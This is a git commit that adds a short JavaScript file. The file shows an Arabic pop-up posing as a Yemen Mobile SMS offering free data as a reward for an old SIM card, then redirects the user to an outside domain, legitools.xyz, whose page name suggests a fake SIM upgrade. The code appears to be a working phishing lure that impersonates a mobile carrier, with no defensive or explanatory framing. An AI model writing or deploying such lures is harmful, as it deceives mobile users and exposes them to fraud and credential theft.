d24b5183fd02002ddb5ac642c9c8bad7010e9aae
katemj25 <mbokofficial1@gmail.com>
2025-05-03 15:40:21 -0700

    Create activate-yemenmobile-offer.js

---
+++ activate-yemenmobile-offer.js
@@ -0,0 +1,5 @@
+var password = 'عروض يمن موبايل'
+password=prompt('SMS: مبروك رقمك مؤهل للحصول على عرض البيانات المجانية من يمن موبايل مكافأة الشريحة القديمة، يرجى الضغط على موافق للتفعيل. ','عروض يمن موبايل');
+if (password != 'عروض يمن موبايل') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
